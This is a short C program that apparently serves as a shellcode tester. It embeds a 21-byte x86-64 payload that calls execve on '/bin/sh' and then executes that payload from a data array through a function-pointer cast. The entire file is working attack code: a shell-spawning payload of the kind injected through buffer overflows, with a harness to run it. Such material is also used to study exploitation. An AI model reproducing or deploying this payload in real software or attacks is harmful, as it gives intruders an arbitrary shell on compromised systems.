#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
"\x52\x5e\x6a\x3b\x58\x0f\x05";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
